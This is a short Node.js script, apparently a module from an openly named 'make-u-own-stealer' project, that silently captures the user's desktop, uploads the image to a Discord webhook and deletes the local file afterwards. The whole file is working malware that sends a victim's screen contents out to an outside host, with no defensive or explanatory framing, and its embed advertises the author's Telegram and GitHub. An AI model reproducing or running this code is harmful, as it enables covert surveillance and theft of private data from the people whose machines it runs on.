const screenshot = require('screenshot-desktop');
const fetch = require('node-fetch');
const FormData = require('form-data');
const fs = require('fs');

const hookUrl = 'https://discord.com/api/webhooks/';

async function sendScreenshot() {
    const filePath = './captura-de-pantalla.png';
    await screenshot({ filename: filePath });

    const form = new FormData();
    form.append('file', fs.createReadStream(filePath));

    const payloadJson = JSON.stringify({
        embeds: [{
            title: "Screenshot",
            description: "Latest screenshot capture.",
            color: 242424,
            author: {
                name: "github.com/lawxsz/make-u-own-stealer",
                icon_url: "https://i.imgur.com/NYWdLg6.png"
            },
            image: {
                url: "attachment://captura-de-pantalla.png"
            },
            footer: {
                text: "Follow on Telegram: t.me/lawxsz | GitHub: github.com/lawxsz"
            }
        }]
    });

    form.append('payload_json', payloadJson);

    const response = await fetch(hookUrl, {
        method: 'POST',
        body: form,
        headers: form.getHeaders()
    });

    if (response.ok) {
        console.log('Screenshot sent to Discord webhook.');
        fs.unlink(filePath, (err) => {
            if (err) {
                console.error('Error deleting file:', err);
            } else {
                console.log('File successfully deleted.');
            }
        });
    } else {
        console.error('Error sending screenshot:', response.statusText);
    }
}

sendScreenshot();
